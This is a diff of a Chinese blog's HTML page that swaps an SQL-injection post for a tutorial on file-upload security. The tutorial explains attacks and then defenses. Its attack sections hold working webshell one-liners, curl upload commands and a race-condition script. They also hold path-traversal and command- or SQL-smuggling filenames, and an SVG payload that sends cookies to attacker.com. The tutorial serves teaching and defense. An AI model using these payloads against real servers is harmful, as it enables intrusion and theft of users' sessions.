@@ -4,10 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="SQL 注入原理与防御指南, 是小竹不是小猪">
-    <meta name="description" content="SQL 注入是 Web 安全中最经典也最持久的漏洞类型之一。理解它的本质，不需要大量工具记忆，核心在于理解一条原则：当用户输入被当作 SQL 指令执行时，注入就发生了。
-注入原理根本原因SQL 注入的根源是数据与指令的边界混淆。
-在正常的 ">
+    <meta name="keywords" content="文件上传安全：原理、攻击与防御, 是小竹不是小猪">
+    <meta name="description" content="一、文件上传的核心原理1.1 HTTP  multipart/form-data 协议文件上传依赖 HTTP POST 请求的 multipart/form-data 编码类型。与 application/x-www-form-urlenc">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>SQL 注入原理与防御指南 | 是小竹不是小猪</title>
+    <title>文件上传安全：原理、攻击与防御 | 是小竹不是小猪</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -311,12 +309,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">SQL 注入原理与防御指南</h1>
+                    <h1 class="description center-align post-title">文件上传安全：原理、攻击与防御</h1>
                 </div>
             </div>
         </div>
@@ -432,8 +430,16 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
-                                <span class="chip bg-color">SQL注入</span>
+                            <a href="/tags/%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">安全</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+                                <span class="chip bg-color">文件上传</span>
+                            </a>
+                        
+                            <a href="/tags/Web%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">Web安全</span>
                             </a>
                         
                     </div>
@@ -448,7 +454,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2026-08-03
+                    2026-08-06
                 </div>
                 
 
@@ -469,100 +475,313 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>SQL 注入是 Web 安全中最经典也最持久的漏洞类型之一。理解它的本质，不需要大量工具记忆，核心在于理解一条原则：当用户输入被当作 SQL 指令执行时，注入就发生了。</p>
-<h2 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h2><h3 id="根本原因"><a href="#根本原因" class="headerlink" title="根本原因"></a>根本原因</h3><p>SQL 注入的根源是<strong>数据与指令的边界混淆</strong>。</p>
-<p>在正常的 SQL 执行流程中，应用程序将用户输入拼接到 SQL 语句中，数据库引擎解析这条语句并执行。问题在于，数据库引擎在解析时无法区分”开发者写的固定指令”和”用户提供的数据”。当用户输入中包含 SQL 语法字符（如单引号 <code>&#39;</code>、分号 <code>;</code>、注释符 <code>--</code>）时，这些字符会改变原始 SQL 语句的逻辑结构。</p>
-<p>以一个典型的登录查询为例：</p>
-<pre><code class="sql">SELECT * FROM users WHERE username=&#39;[input]&#39; AND password=&#39;[input]&#39;
+                <h3 id="一、文件上传的核心原理"><a href="#一、文件上传的核心原理" class="headerlink" title="一、文件上传的核心原理"></a>一、文件上传的核心原理</h3><h4 id="1-1-HTTP-multipart-form-data-协议"><a href="#1-1-HTTP-multipart-form-data-协议" class="headerlink" title="1.1 HTTP  multipart/form-data 协议"></a>1.1 HTTP  multipart/form-data 协议</h4><p>文件上传依赖 HTTP POST 请求的 <code>multipart/form-data</code> 编码类型。与 <code>application/x-www-form-urlencoded</code> 不同，它将请求体按 boundary 分割为多个部分，每个部分可以携带独立的 Content-Type 和文件名。</p>
+<pre><code>POST /upload HTTP/1.1
+Host: example.com
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk
+
+------WebKitFormBoundary7MA4YWxk
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;
+Content-Type: application/x-php
+
+&lt;?php phpinfo(); ?&gt;
+------WebKitFormBoundary7MA4YWxk--
 </code></pre>
-<p>正常情况下，用户输入 <code>admin</code> 作为用户名，拼接后：</p>
-<pre><code class="sql">SELECT * FROM users WHERE username=&#39;admin&#39; AND password=&#39;[input]&#39;
+<p>关键点在于：<code>filename</code> 字段和 <code>Content-Type</code> 字段完全由客户端控制，服务端不能信任这两个值中的任何一个。这是文件上传安全问题的根源。</p>
+<h4 id="1-2-服务端处理流程"><a href="#1-2-服务端处理流程" class="headerlink" title="1.2 服务端处理流程"></a>1.2 服务端处理流程</h4><p>典型的服务端文件上传处理分为以下几个阶段：接收原始字节流 → 解析 multipart 结构 → 提取文件名和类型 → 执行校验逻辑 → 写入文件系统或对象存储 → 返回结果。</p>
+<p>攻击面分布在这条链路的几乎每个环节。文件名解析阶段的绕过针对的是”校验逻辑”，内容类型伪造针对的也是”校验逻辑”，而路径穿越则同时涉及文件名解析和写入阶段。</p>
+<h4 id="1-3-为什么文件上传危险"><a href="#1-3-为什么文件上传危险" class="headerlink" title="1.3 为什么文件上传危险"></a>1.3 为什么文件上传危险</h4><p>文件上传的本质风险是：攻击者将恶意内容写入服务端可执行环境。一旦满足两个条件就构成完整漏洞——恶意内容被存储到了服务端，且该内容能被服务端以某种方式执行或触发。</p>
+<hr>
+<h3 id="二、攻击手段全景"><a href="#二、攻击手段全景" class="headerlink" title="二、攻击手段全景"></a>二、攻击手段全景</h3><h4 id="2-1-文件类型绕过"><a href="#2-1-文件类型绕过" class="headerlink" title="2.1 文件类型绕过"></a>2.1 文件类型绕过</h4><p><strong>2.1.1 前端校验绕过</strong></p>
+<p>最基础的场景。很多系统仅靠 JavaScript 的 <code>accept</code> 属性或文件扩展名白名单做前端拦截。攻击者只需修改请求中的 <code>filename</code> 扩展名即可绕过，或者直接用 Burp Suite / curl 构造请求，完全跳过前端。</p>
+<pre><code class="bash"># 将 .php 改为 .jpg，但内容仍是 PHP
+curl -X POST http://target/upload \
+  -F &quot;file=@shell.php;type=image/jpeg;filename=shell.jpg&quot;
 </code></pre>
-<p>如果攻击者输入 <code>&#39; OR &#39;1&#39;=&#39;1</code> 作为用户名，拼接后变成：</p>
-<pre><code class="sql">SELECT * FROM users WHERE username=&#39;&#39; OR &#39;1&#39;=&#39;1&#39; AND password=&#39;[input]&#39;
+<p><strong>2.1.2 MIME 类型伪造</strong></p>
+<p>HTTP 请求中每个 multipart 部分都有一个 <code>Content-Type</code> 字段，这个值完全由客户端填写，服务端读到的就是客户端发的原文。问题在于很多开发者用这个值来判断文件类型：</p>
+<pre><code class="php">// 危险写法：直接信任客户端发来的 Content-Type
+if ($_FILES[&#39;file&#39;][&#39;type&#39;] === &#39;image/jpeg&#39;) &#123;
+    move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &#39;/uploads/&#39; . $_FILES[&#39;file&#39;][&#39;name&#39;]);
+&#125;
 </code></pre>
-<p><code>&#39;1&#39;=&#39;1&#39;</code> 恒为真，<code>OR</code> 条件使整个 WHERE 子句永远成立，查询返回所有用户记录。攻击者绕过了认证。</p>
-<h3 id="注入的本质"><a href="#注入的本质" class="headerlink" title="注入的本质"></a>注入的本质</h3><p>从更抽象的层面看，SQL 注入是一种<strong>注入攻击（Injection Attack）</strong>的特例。所有注入攻击的共同特征是：外部输入未经充分处理就被嵌入到目标语言的执行上下文中。SQL 注入的目标语言是 SQL，类似的还有命令注入（目标是 Shell）、XSS（目标是浏览器 JS 引擎）、SSTI（目标是模板引擎）。</p>
-<p>理解这一点很重要，因为防御思路是通用的：在数据进入执行上下文之前，消除其作为指令的能力。</p>
-<h2 id="常见注入方法"><a href="#常见注入方法" class="headerlink" title="常见注入方法"></a>常见注入方法</h2><h3 id="联合查询注入（UNION-注入）"><a href="#联合查询注入（UNION-注入）" class="headerlink" title="联合查询注入（UNION 注入）"></a>联合查询注入（UNION 注入）</h3><p>适用条件：页面有回显，且原始查询的列数可知。</p>
-<p>原理：利用 <code>UNION SELECT</code> 将恶意查询结果附加到原始查询结果中，直接在页面上显示。</p>
-<p>步骤：</p>
+<p>攻击者用 Burp Suite 或 curl 构造请求时，把 <code>Content-Type</code> 随便写：</p>
+<pre><code class="bash">curl -F &quot;file=@webshell.php;type=image/jpeg&quot; http://target/upload
+</code></pre>
+<p>服务端收到的 <code>$_FILES[&#39;file&#39;][&#39;type&#39;]</code> 就是 <code>image/jpeg</code>，校验通过，但实际写入磁盘的是一个 PHP 文件。本质原因是 <strong>HTTP 协议层面没有任何机制强制客户端如实声明文件类型</strong>，这只是一个建议性的请求头字段，和浏览器自动检测的真实类型无关。PHP 中 <code>$_FILES[&#39;file&#39;][&#39;type&#39;]</code> 读的就是这个值，完全不可信。</p>
+<p><strong>2.1.3 扩展名黑名单绕过</strong></p>
+<p>黑名单策略试图拦截 <code>.php</code>、<code>.jsp</code>、<code>.exe</code> 等危险扩展名，但几乎不可能穷举所有变体：</p>
+<ul>
+<li>大小写变体：<code>.PhP</code>、<code>.pHp</code></li>
+<li>双写绕过：<code>.pphphp</code>（如果过滤逻辑只删除一次 <code>.php</code>）</li>
+<li>等价扩展名：<code>.php3</code>、<code>.php5</code>、<code>.phtml</code>、<code>.phps</code>（Apache 可配置为解析 PHP）</li>
+<li>不可见字符：<code>shell.php </code>（末尾空格）、<code>shell.php.</code>（末尾点号），Windows 会自动去除</li>
+<li><code>.htaccess</code> 上传：上传 <code>.htaccess</code> 文件让服务器将 <code>.jpg</code> 当 PHP 解析</li>
+</ul>
+<pre><code class="apache"># .htaccess 内容：让所有 .jpg 文件被当作 PHP 执行
+AddType application/x-httpd-php .jpg
+</code></pre>
+<p>三种典型手法的原理展开：</p>
+<p><strong>大小写变体。</strong> 黑名单通常只列了小写的 <code>.php</code>，但 Windows 文件系统不区分大小写，<code>Shell.PhP</code> 和 <code>shell.php</code> 指向同一个文件。如果服务端用字符串匹配做黑名单检查但没做 <code>toLowerCase()</code>，<code>PhP</code> 就绕过了。Linux 上虽然文件系统区分大小写，但 Apache 的 <code>AddHandler</code> 配置也可以做成大小写不敏感匹配。</p>
+<p><strong>双扩展名 <code>shell.php.jpg</code>。</strong> 分两种情况。第一种，有些系统的校验逻辑是”看最后一个扩展名是不是在白名单里”，<code>shell.php.jpg</code> 的最后扩展名是 <code>.jpg</code>，通过了检查。但如果 Apache 配置了 <code>AddHandler php-script .php</code>，它会从文件名中找到 <code>.php</code> 并按 PHP 执行，忽略后面的 <code>.jpg</code>。第二种，如果校验逻辑是”文件名中是否包含 <code>.php</code>“，攻击者可能用 <code>shell.php.jpg.php</code> 来绕过——有些过滤只检查一次，替换掉第一个 <code>.php</code> 后还剩一个。</p>
+<p><strong>空字节截断 <code>shell.php%00.jpg</code>。</strong> 这个问题出在 C 语言层面。C 字符串以 <code>\0</code>（空字节）作为终止符。PHP 5.3.4 以下版本和早期 Java 的文件操作中，文件名在传递给底层 C 函数（如 <code>fopen</code>、<code>stat</code>）之前没有过滤空字节。攻击者发送 <code>filename=shell.php%00.jpg</code>，服务端的校验逻辑看到的是 <code>shell.php.jpg</code>（按字符串比较，<code>.jpg</code> 后缀安全），但传递给操作系统写入文件时，C 函数遇到 <code>%00</code> 就截断了，实际创建的文件名是 <code>shell.php</code>。这个漏洞在现代 PHP（5.3.4+）中已修复，但在一些老旧系统或用 JNI 调用本地库的 Java 应用中仍可能遇到。</p>
+<p><strong>2.1.4 Magic Number（文件头）伪造</strong></p>
+<p>服务端如果只检查文件前几个字节（magic number），攻击者可以在恶意文件头部插入合法的文件签名：</p>
+<pre><code>GIF89a
+&lt;?php phpinfo(); ?&gt;
+</code></pre>
+<p>这样文件的前 6 个字节就是 GIF 的 magic number <code>47 49 46 38 39 61</code>，能通过文件头检查。如果服务端没有进一步校验文件完整性（比如图片是否能正常解码），这种绕过就能成功。</p>
+<p><strong>2.1.5 条件竞争（Race Condition）</strong></p>
+<p>当服务端采用”先保存再删除”的策略时（先写入临时文件，检查不通过后删除），存在一个时间窗口。攻击者可以并发发送大量请求，在文件被删除之前访问它：</p>
+<pre><code class="python">import threading
+import requests
+
+target = &quot;http://target/uploads/&quot;
+
+def access_file():
+    while True:
+        r = requests.get(target + &quot;shell.php&quot;)
+        if r.status_code == 200 and &quot;phpinfo&quot; in r.text:
+            print(&quot;Got shell!&quot;)
+            break
+
+# 上传线程
+def upload_file():
+    while True:
+        requests.post(&quot;http://target/upload&quot;,
+            files=&#123;&quot;file&quot;: (&quot;shell.php&quot;, b&quot;&lt;?php phpinfo(); ?&gt;&quot;)&#125;)
+
+threads = [threading.Thread(target=access_file) for _ in range(10)]
+threads += [threading.Thread(target=upload_file) for _ in range(5)]
+for t in threads: t.start()
+</code></pre>
+<h4 id="2-2-路径穿越（Path-Traversal）"><a href="#2-2-路径穿越（Path-Traversal）" class="headerlink" title="2.2 路径穿越（Path Traversal）"></a>2.2 路径穿越（Path Traversal）</h4><p>攻击者在文件名中注入 <code>../</code> 序列，试图将文件写入 Web 根目录之外的任意位置：</p>
+<pre><code>filename=../../etc/cron.d/backdoor
+filename=..\..\Windows\System32\cmd.exe
+</code></pre>
+<p>不同语言的路径穿越风险点不同。Java 的 <code>File.getName()</code> 不会自动过滤 <code>../</code>，Python 的 <code>os.path.join</code> 遇到绝对路径会直接切换根目录。Node.js 的 <code>path.resolve</code> 也有类似问题。</p>
+<h4 id="2-3-文件名注入"><a href="#2-3-文件名注入" class="headerlink" title="2.3 文件名注入"></a>2.3 文件名注入</h4><p>文件名是用户可控的字符串。如果后端拿到文件名后不做转义就直接拼进其他操作，就会引发与上传无关的第二层漏洞。</p>
+<p><strong>SQL 注入场景：</strong></p>
+<pre><code class="php">$filename = $_FILES[&#39;file&#39;][&#39;name&#39;];  // 攻击者可控
+// 假设攻击者构造 filename = &quot;x.jpg&#39;); DROP TABLE uploads;--&quot;
+$sql = &quot;INSERT INTO files (filename, path) VALUES (&#39;$filename&#39;, &#39;$path&#39;)&quot;;
+// 展开后：
+// INSERT INTO files (filename, path) VALUES (&#39;x.jpg&#39;); DROP TABLE uploads;--&#39;, &#39;/uploads/xxx&#39;)
+</code></pre>
+<p>数据库执行了攻击者注入的 <code>DROP TABLE</code>。</p>
+<p><strong>命令注入场景：</strong></p>
+<pre><code class="php">$filename = $_FILES[&#39;file&#39;][&#39;name&#39;];  // 攻击者构造: &quot;a.jpg; cat /etc/passwd&quot;
+system(&quot;file /uploads/&quot; . $filename);
+// 展开后：
+// file /uploads/a.jpg; cat /etc/passwd
+</code></pre>
+<p>shell 会把 <code>;</code> 后面的内容当作第二条命令执行。</p>
+<p><strong>日志注入场景：</strong> 如果文件名被原样写入 access log，攻击者可以注入换行符伪造日志条目，或者注入 <code>%s</code> 等格式化字符串触发格式化字符串漏洞。</p>
+<p>核心问题是：<strong>文件名被当作不可信输入，但下游代码把它当成了安全数据。</strong></p>
+<h4 id="2-4-解析漏洞利用"><a href="#2-4-解析漏洞利用" class="headerlink" title="2.4 解析漏洞利用"></a>2.4 解析漏洞利用</h4><p><strong>2.4.1 Apache 多扩展名解析</strong></p>
+<p>Apache 默认从右向左识别扩展名，如果右侧扩展名无法识别，则向左回溯。配置 <code>AddHandler</code> 后，<code>shell.php.xxx</code> 可能被当作 PHP 执行。</p>
+<p><strong>2.4.2 IIS 解析漏洞</strong></p>
+<p>IIS 6.0 中，目录名包含 <code>.asp</code> 则该目录下所有文件都被当作 ASP 执行（如 <code>/xx.asp/</code> 目录下的 <code>.jpg</code> 文件）。IIS 7.0/7.5 在 <code>cgi.fix_pathinfo=1</code> 时存在解析漏洞：访问 <code>/upload/1.jpg/.php</code>，如果 <code>1.jpg</code> 存在，则按 PHP 解析。</p>
+<p><strong>2.4.3 Nginx 解析漏洞</strong></p>
+<p>Nginx 的 <code>cgi.fix_pathinfo</code> 配置不当也会导致类似问题。此外，如果配置了 <code>location ~ \.php$</code> 和 <code>location /upload/</code>，上传 <code>shell.jpg</code> 后访问 <code>shell.jpg/.php</code> 可能被 PHP-FPM 解析。</p>
+<p><strong>2.4.4 PHP 的 <code>$_FILES</code> 特性</strong></p>
+<p>PHP 在处理 <code>multipart/form-data</code> 时，如果存在多个同名的 <code>file</code> 字段，后面的值会覆盖前面的值。攻击者可以利用这个特性绕过只检查第一个文件的逻辑：</p>
+<pre><code>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;a.jpg&quot;
+Content-Type: image/jpeg
+[jpeg data]
+
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;
+Content-Type: application/x-php
+[php code]
+</code></pre>
+<h4 id="2-5-内容相关攻击"><a href="#2-5-内容相关攻击" class="headerlink" title="2.5 内容相关攻击"></a>2.5 内容相关攻击</h4><p><strong>2.5.1 WebShell 上传</strong></p>
+<p>最终目标通常是上传一个 WebShell——一段能被服务端解释器执行的恶意代码。不同语言有不同形态：</p>
+<pre><code class="php">// PHP 一句话木马
+&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;
+</code></pre>
+<pre><code class="jsp">// JSP WebShell
+&lt;% Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)); %&gt;
+</code></pre>
+<pre><code class="python"># Python (Flask debug 模式下)
+&#123;&#123; config.__class__.__init__.__globals__['os'].popen('id').read() &#125;&#125;
+</code></pre>
+<p><strong>2.5.2 图片马（Polyglot）</strong></p>
+<p>将恶意代码嵌入图片文件的冗余数据区域（如 EXIF Comment、GIF 尾部），使其既是合法图片又是可执行脚本。配合文件包含漏洞（LFI）触发执行：</p>
+<pre><code class="bash"># 将 PHP 代码写入图片的 EXIF 注释
+exiftool -Comment=&quot;&lt;?php phpinfo(); ?&gt;&quot; image.jpg
+</code></pre>
+<p><strong>2.5.3 二次注入 / 存储型 XSS</strong></p>
+<p>假设一个社交平台允许用户上传头像，且上传目录可以通过 <code>https://www.example.com/uploads/xxx.svg</code> 直接访问。攻击者上传一个 SVG 文件：</p>
+<pre><code class="xml">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;
+  &lt;script&gt;
+    fetch(&#39;https://www.example.com/api/user/info&#39;).then(r =&gt; r.json()).then(data =&gt; &#123;
+      new Image().src = &#39;https://attacker.com/steal?cookie=&#39; + document.cookie;
+    &#125;);
+  &lt;/script&gt;
+&lt;/svg&gt;
+</code></pre>
+<p>当其他用户浏览到这个 SVG 时，浏览器会渲染它并执行其中的 JavaScript。因为 SVG 和主站在同一个域名 <code>www.example.com</code> 下，这段脚本能读取主站的 Cookie、调用主站的 API、以受害者的身份执行操作。</p>
+<p>这里的关键不是上传本身有漏洞，而是 <strong>上传目录没有做域名隔离</strong>。如果上传文件放在 <code>files.example.com</code> 或 CDN/OSS 上，即使 SVG 里有恶意脚本，它也只能在 <code>files.example.com</code> 的上下文中执行，拿不到主站的 Cookie。</p>
+<p>如果上传目录没有做独立的 Origin 隔离或 CSP 限制，这段脚本会在目标域下执行。</p>
+<h4 id="2-6-拒绝服务（DoS）"><a href="#2-6-拒绝服务（DoS）" class="headerlink" title="2.6 拒绝服务（DoS）"></a>2.6 拒绝服务（DoS）</h4><p>上传超大文件、Zip 炸弹（解压后体积指数膨胀）、或大量并发上传耗尽磁盘/连接资源。一个经典的 Zip 炸弹是 42KB 的 ZIP 文件解压后达到 4.5PB。</p>
+<hr>
+<h3 id="三、防御策略"><a href="#三、防御策略" class="headerlink" title="三、防御策略"></a>三、防御策略</h3><h4 id="3-1-文件名处理"><a href="#3-1-文件名处理" class="headerlink" title="3.1 文件名处理"></a>3.1 文件名处理</h4><p><strong>核心原则：永远不要信任客户端传来的文件名。</strong></p>
+<p>最安全的做法是服务端生成随机文件名，仅保留原始扩展名用于类型判断：</p>
+<pre><code class="java">// Java: 生成随机文件名
+String originalName = file.getOriginalFilename();
+String ext = FilenameUtils.getExtension(originalName);
+String storedName = UUID.randomUUID().toString() + &quot;.&quot; + ext;
+Path target = uploadDir.resolve(storedName);
+</code></pre>
+<pre><code class="python"># Python: 使用 werkzeug 的安全文件名处理
+from werkzeug.utils import secure_filename
+import os, uuid
+
+filename = secure_filename(file.filename)  # 去除路径分隔符和特殊字符
+ext = os.path.splitext(filename)[1]
+stored_name = f&quot;&#123;uuid.uuid4().hex&#125;&#123;ext&#125;&quot;
+</code></pre>
+<pre><code class="php">// PHP: 生成随机文件名
+$ext = pathinfo($_FILES[&#39;file&#39;][&#39;name&#39;], PATHINFO_EXTENSION);
+$stored_name = bin2hex(random_bytes(16)) . &#39;.&#39; . $ext;
+</code></pre>
+<p>如果必须保留原始文件名，需要过滤 <code>../</code>、<code>..\\</code>、空字节 <code>%00</code>、以及所有控制字符，并做路径规范化后验证结果路径仍在预期目录内：</p>
+<pre><code class="java">Path target = uploadDir.resolve(filename).normalize();
+if (!target.startsWith(uploadDir)) &#123;
+    throw new SecurityException(&quot;Path traversal detected&quot;);
+&#125;
+</code></pre>
+<h4 id="3-2-文件类型校验（多层纵深）"><a href="#3-2-文件类型校验（多层纵深）" class="headerlink" title="3.2 文件类型校验（多层纵深）"></a>3.2 文件类型校验（多层纵深）</h4><p>单一校验手段都可以被绕过，必须多层叠加：</p>
+<p><strong>第一层：扩展名白名单。</strong> 白名单优于黑名单，因为可枚举的合法类型远少于需要拦截的类型。注意处理大小写、双扩展名（<code>shell.php.jpg</code>）、空字节截断（<code>shell.php%00.jpg</code>，Java/PHP 5.3 以下受影响）。</p>
+<p><strong>第二层：Magic Number 校验。</strong> 读取文件实际内容的前几个字节，与预期签名比对：</p>
+<pre><code class="python">MAGIC_NUMBERS = &#123;
+    b&#39;\xff\xd8\xff&#39;: &#39;jpg&#39;,
+    b&#39;\x89PNG&#39;: &#39;png&#39;,
+    b&#39;GIF87a&#39;: &#39;gif&#39;,
+    b&#39;GIF89a&#39;: &#39;gif&#39;,
+    b&#39;%PDF&#39;: &#39;pdf&#39;,
+&#125;
+
+def verify_magic(file_path, expected_type):
+    with open(file_path, &#39;rb&#39;) as f:
+        header = f.read(8)
+    for magic, ftype in MAGIC_NUMBERS.items():
+        if header.startswith(magic) and ftype == expected_type:
+            return True
+    return False
+</code></pre>
+<pre><code class="java">// Java: 使用 Tika 做内容类型检测
+Tika tika = new Tika();
+String detected = tika.detect(file.getInputStream());
+if (!&quot;image/jpeg&quot;.equals(detected)) &#123;
+    throw new SecurityException(&quot;Content type mismatch&quot;);
+&#125;
+</code></pre>
+<p><strong>第三层：内容完整性校验。</strong> 对图片文件，用图像处理库尝试解码并重新编码，验证它确实是合法图片：</p>
+<pre><code class="python">from PIL import Image
+
+def verify_image(file_path):
+    try:
+        img = Image.open(file_path)
+        img.verify()  # 验证图片完整性
+        return True
+    except Exception:
+        return False
+</code></pre>
+<p><strong>第四层：MIME 类型交叉验证。</strong> 将扩展名、magic number、<code>Content-Type</code> 三者交叉比对，任何不一致都拒绝。</p>
+<h4 id="3-3-存储与执行隔离"><a href="#3-3-存储与执行隔离" class="headerlink" title="3.3 存储与执行隔离"></a>3.3 存储与执行隔离</h4><p><strong>上传目录禁止执行。</strong> 这是最关键的一道防线。即使前面所有校验都被绕过，只要上传目录不能执行脚本，攻击就无法完成。</p>
+<pre><code class="apache"># Apache: 上传目录禁止执行脚本
+&lt;Directory &quot;/var/www/uploads&quot;&gt;
+    Options -ExecCGI
+    RemoveHandler .php .phtml .php3 .php5
+    &lt;FilesMatch &quot;\.(php|phtml|php3|php5|pl|py|jsp|asp|aspx)$&quot;&gt;
+        Require all denied
+    &lt;/FilesMatch&gt;
+&lt;/Directory&gt;
+</code></pre>
+<pre><code class="nginx"># Nginx: 上传目录只允许静态文件
+location /uploads/ &#123;
+    location ~ \.(php|jsp|asp|aspx|py|pl)$ &#123;
+        deny all;
+    &#125;
+&#125;
+</code></pre>
+<p><strong>使用独立的文件存储域名或 CDN。</strong> 将上传文件放在 <code>files.example.com</code> 或对象存储（如 S3/OSS）上，与应用主域名 <code>www.example.com</code> 隔离。这样即使上传了 XSS payload，也无法读取主域的 Cookie。配合 <code>Content-Security-Policy</code> 和独立的 Origin 进一步限制。</p>
+<p><strong>对象存储优先于本地文件系统。</strong> 使用 S3/OSS 等对象存储天然不存在本地文件执行的风险，且可以设置 Bucket Policy 限制 Content-Type 和公开访问范围。</p>
+<h4 id="3-4-文件大小与速率限制"><a href="#3-4-文件大小与速率限制" class="headerlink" title="3.4 文件大小与速率限制"></a>3.4 文件大小与速率限制</h4><pre><code class="python"># Flask 示例
+app.config[&#39;MAX_CONTENT_LENGTH&#39;] = 10 * 1024 * 1024  # 10MB 上限
+
+# 速率限制
+from flask_limiter import Limiter
+limiter = Limiter(app, default_limits=[&quot;100 per minute&quot;])
+
+@app.route(&quot;/upload&quot;, methods=[&quot;POST&quot;])
+@limiter.limit(&quot;10 per minute&quot;)
+def upload():
+    ...
+</code></pre>
+<p>对压缩包必须做解压后的体积检查（防止 Zip 炸弹），设置解压倍率上限（如原始大小的 100 倍）。</p>
+<h4 id="3-5-防病毒扫描"><a href="#3-5-防病毒扫描" class="headerlink" title="3.5 防病毒扫描"></a>3.5 防病毒扫描</h4><p>对上传文件做病毒扫描，可以集成 ClamAV 等开源引擎：</p>
+<pre><code class="java">// Java 集成 ClamAV
+try (Socket socket = new Socket(&quot;localhost&quot;, 3310);
+     OutputStream os = socket.getOutputStream();
+     InputStream is = socket.getInputStream()) &#123;
+    os.write(&quot;zSCAN\n&quot;.getBytes());
+    os.write(fileBytes);
+    os.write(&quot;\0&quot;.getBytes());
+    // 读取扫描结果
+&#125;
+</code></pre>
+<h4 id="3-6-安全响应头"><a href="#3-6-安全响应头" class="headerlink" title="3.6 安全响应头"></a>3.6 安全响应头</h4><p>服务端返回上传文件时，设置以下响应头降低风险：</p>
+<pre><code>Content-Disposition: attachment; filename=&quot;downloaded-file.jpg&quot;
+X-Content-Type-Options: nosniff
+Content-Security-Policy: default-src &#39;none&#39;; style-src &#39;self&#39; &#39;unsafe-inline&#39;
+</code></pre>
+<p><code>Content-Disposition: attachment</code> 强制浏览器下载而非内联渲染，阻止 SVG/HTML 的 XSS 执行。<code>nosniff</code> 阻止浏览器 MIME 嗅探。CSP 限制文件只能加载自身资源。</p>
+<hr>
+<h3 id="四、各语言常见陷阱"><a href="#四、各语言常见陷阱" class="headerlink" title="四、各语言常见陷阱"></a>四、各语言常见陷阱</h3><h4 id="4-1-Java"><a href="#4-1-Java" class="headerlink" title="4.1 Java"></a>4.1 Java</h4><ul>
+<li><code>MultipartFile.getOriginalFilename()</code> 返回的是客户端提供的原始值，不可信</li>
+<li><code>File.renameTo()</code> 在某些平台上不保证原子性，条件竞争场景需注意</li>
+<li>Apache Commons FileUpload 旧版本存在路径穿越漏洞（CVE-2016-1000030）</li>
+<li>Spring Boot 默认使用临时目录存储上传文件，需确保临时目录权限正确</li>
+</ul>
+<h4 id="4-2-PHP"><a href="#4-2-PHP" class="headerlink" title="4.2 PHP"></a>4.2 PHP</h4><ul>
+<li><code>$_FILES[&#39;file&#39;][&#39;type&#39;]</code> 来自请求头，完全可伪造</li>
+<li><code>move_uploaded_file()</code> 是安全的上传函数，它会检查文件确实通过 HTTP POST 上传</li>
+<li><code>getimagesize()</code> 可以验证图片尺寸，但不能完全替代内容校验</li>
+<li>PHP 5.3 以下存在空字节截断漏洞：<code>shell.php%00.jpg</code> 在文件系统操作中被截断为 <code>shell.php</code></li>
+<li><code>$_FILES</code> 同名覆盖特性（同名字段后者覆盖前者）</li>
+</ul>
+<h4 id="4-3-Python"><a href="#4-3-Python" class="headerlink" title="4.3 Python"></a>4.3 Python</h4><ul>
+<li><code>os.path.join(base, user_input)</code> 如果 <code>user_input</code> 是绝对路径，会直接返回 <code>user_input</code></li>
+<li>Flask 的 <code>secure_filename()</code> 会剥离路径分隔符和特殊字符，但不处理 magic number</li>
+<li>Django 的 <code>FileField</code> 默认不校验文件内容类型</li>
+<li>Pillow 的 <code>Image.verify()</code> 只检查文件头，不保证图片完全合法；更安全的做法是打开图片后重新保存</li>
+</ul>
+<hr>
+<h3 id="五、完整防御清单"><a href="#五、完整防御清单" class="headerlink" title="五、完整防御清单"></a>五、完整防御清单</h3><p>将防御措施按优先级排列：</p>
 <ol>
-<li><p>确定列数。使用 <code>ORDER BY n</code> 逐步增大 n，直到报错，前一个成功的 n 即为列数。或者使用 <code>UNION SELECT NULL,NULL,...</code> 逐个试探。</p>
-</li>
-<li><p>确定回显位置。在 <code>UNION SELECT</code> 的各列中填入不同的可识别值（如 1,2,3），观察页面显示哪些值，这些位置就是可控的回显点。</p>
-</li>
-<li><p>提取数据。在回显点替换为目标查询，如 <code>version()</code>、<code>database()</code>、<code>GROUP_CONCAT(table_name)</code> 等。</p>
-</li>
+<li>上传目录禁止执行脚本（最关键，最后一道防线）</li>
+<li>服务端生成随机文件名，不信任客户端文件名</li>
+<li>扩展名白名单（而非黑名单）</li>
+<li>Magic Number + 内容完整性校验（图片重编码验证）</li>
+<li>文件大小限制 + 上传速率限制</li>
+<li>独立域名/对象存储隔离上传文件</li>
+<li>安全响应头（Content-Disposition: attachment, nosniff, CSP）</li>
+<li>防病毒扫描</li>
+<li>日志记录所有上传行为（文件名、IP、时间、大小、哈希）</li>
+<li>定期审计上传目录中的文件</li>
 </ol>
